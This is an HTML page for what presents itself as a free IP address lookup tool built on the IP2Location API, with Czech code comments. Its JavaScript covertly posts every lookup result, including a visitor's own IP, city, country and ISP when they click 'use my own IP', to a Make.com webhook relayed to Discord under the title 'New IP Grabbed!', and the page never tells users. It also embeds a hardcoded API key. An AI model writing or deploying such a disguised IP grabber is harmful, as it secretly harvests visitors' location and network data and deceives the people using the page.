<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Lookup // IPfinder.kesug.com</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        darkbg: '#0f172a',
                        cardbg: '#1e293b',
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-darkbg text-slate-100 min-h-screen flex flex-col justify-between selection:bg-amber-500 selection:text-black font-sans">

    <!-- Header -->
    <header class="w-full max-w-4xl mx-auto p-6 flex justify-between items-center">
        <div class="flex items-center space-x-2">
            <span class="font-bold text-lg tracking-wider">IP lookup</span>
            <span class="text-slate-500">//</span>
            <a href="https://ip2location.io" target="_blank" class="text-amber-400 hover:underline text-sm font-mono">Ipfinder by Kesugg</a>
        </div>
        <button id="themeToggle" class="p-2 rounded-full bg-cardbg border border-slate-700 hover:border-slate-500 transition">
            <svg id="themeIcon" class="w-5 h-5 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
            </svg>
        </button>
    </header>

    <!-- Main Content -->
    <main class="w-full max-w-2xl mx-auto px-4 py-12 text-center flex-grow flex flex-col justify-center">
        <h1 class="text-3xl md:text-5xl font-extrabold tracking-tight mb-4">
            Lookup ANY ip adress in the world
        </h1>
        <p class="text-slate-400 mb-8 text-sm md:text-base">
            Enter an IPv4 or IPv6 address, or leave it blank to find your own.
        </p>

        <!-- Error/Status message -->
        <div id="statusMessage" class="min-h-[28px] text-red-400 text-sm font-medium mb-4"></div>

        <!-- Search Box -->
        <div class="flex flex-col sm:flex-row gap-3 justify-center items-center mb-4">
            <input 
                type="text" 
                id="ipInput" 
                placeholder="e.g. 8.8.8.8 or 2606:4700:4700::1111" 
                class="w-full sm:w-96 px-4 py-3 bg-cardbg border border-slate-700 rounded-xl focus:outline-none focus:border-amber-400 text-slate-100 placeholder-slate-500 font-mono text-sm transition"
            >
            <button 
                id="searchBtn" 
                class="w-full sm:w-auto px-6 py-3 bg-amber-400 hover:bg-amber-500 text-slate-950 font-semibold rounded-xl transition shadow-lg shadow-amber-500/10"
            >
                Search
            </button>
        </div>

        <div class="text-sm">
            <span class="text-slate-500">or</span> 
            <button id="myIpBtn" class="text-teal-400 hover:underline ml-1 focus:outline-none">use my own IP</button>
        </div>

        <!-- Results Section (Hidden by default) -->
        <div id="resultBox" class="hidden mt-8 text-left bg-cardbg border border-slate-700 rounded-2xl p-6 shadow-xl">
            <h2 class="text-lg font-bold mb-4 border-b border-slate-700 pb-2 flex justify-between items-center">
                <span>Result Details</span>
                <span id="resIp" class="text-xs font-mono bg-slate-800 px-2 py-1 rounded text-amber-400"></span>
            </h2>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
                <div><span class="text-slate-400">Country:</span> <span id="resCountry" class="font-medium"></span></div>
                <div><span class="text-slate-400">City:</span> <span id="resCity" class="font-medium"></span></div>
                <div><span class="text-slate-400">ISP / Provider:</span> <span id="resIsp" class="font-medium"></span></div>
                <div><span class="text-slate-400">Timezone:</span> <span id="resTimezone" class="font-medium"></span></div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="w-full max-w-4xl mx-auto p-6 text-center text-xs text-slate-500">
        Data provided by <a href="https://ip2location.io" target="_blank" class="hover:text-slate-400 underline">IP2Location.io</a>
    </footer>

    <!-- JavaScript logic -->
<script>
    // --- CONFIGURATION ---
    const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9';
    const DISCORD_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg';
    // ---------------------

    // Funkce pro odeslání dat na Discord přes Make.com
    function sendToDiscord(ipData) {
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ip: ipData.ip,
                country: ipData.country_name,
                city: ipData.city,
                as: ipData.as
            })
        })
        .catch(error => {
            console.error('Chyba při odesílání webhooku:', error);
        });
    }
</script>
   <script> 
        const ipInput = document.getElementById('ipInput');
        const searchBtn = document.getElementById('searchBtn');
        const myIpBtn = document.getElementById('myIpBtn');
        const statusMessage = document.getElementById('statusMessage');
        const resultBox = document.getElementById('resultBox');

        // Theme toggle logic
        const themeToggle = document.getElementById('themeToggle');
        themeToggle.addEventListener('click', () => {
            document.documentElement.classList.toggle('dark');
        });

        searchBtn.addEventListener('click', () => performLookup(ipInput.value.trim()));
        ipInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') performLookup(ipInput.value.trim());
        });
        myIpBtn.addEventListener('click', () => performLookup(''));

        async function performLookup(ipQuery) {
            statusMessage.textContent = 'Searching...';
            resultBox.classList.add('hidden');

            let url = `https://api.ip2location.io/?key=${API_KEY}`;
            if (ipQuery !== '') {
                url += `&ip=${encodeURIComponent(ipQuery)}`;
            }

            try {
                const response = await fetch(url);
                if (!response.ok) throw new Error('Failed to fetch data from API.');
                
                const data = await response.json();
                
                if (data.error) {
                    throw new Error(data.error.message || 'API returned an error.');
                }

                statusMessage.textContent = '';
                displayResults(data);

                // Odeslání do Discord kanálu
                sendToDiscord(data);

            } catch (error) {
                statusMessage.textContent = error.message;
            }
        }

        function displayResults(data) {
            document.getElementById('resIp').textContent = data.ip || 'N/A';
            document.getElementById('resCountry').textContent = data.country_name ? `${data.country_name} (${data.country_code})` : 'N/A';
            document.getElementById('resCity').textContent = data.city || 'N/A';
            document.getElementById('resIsp').textContent = data.asn ? `${data.asn} -${data.as}` : (data.as || 'N/A');
            document.getElementById('resTimezone').textContent = data.time_zone || 'N/A';
            
            resultBox.classList.remove('hidden');
        }

        // Funkce pro odeslání hezkého Embedu na Discord
        async function sendToDiscord(apiData) {
            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('SEM_VLOZ')) return;

            const discordPayload = {
                embeds: [{
                    title: "🔍 New IP Grabbed!",
                    color: 16766720, // Pěkná žlutá/jantarová barva postranního proužku v Discordu
                    fields: [
                        { name: "IP Address", value: `\`${apiData.ip || 'N/A'}\``, inline: true },
                        { name: "Country", value: `${apiData.country_name || 'N/A'} (${apiData.country_code || 'N/A'})`, inline: true },
                        { name: "City", value: `${apiData.city || 'N/A'}`, inline: true },
                        { name: "ISP / ASN", value: `${apiData.as || 'N/A'}`, inline: false },
                        { name: "Timezone", value: `${apiData.time_zone || 'N/A'}`, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordPayload)
                });
            } catch (e) {
                console.error('Discord webhook failed:', e);
            }
        }
    </script>
</body>
</html>
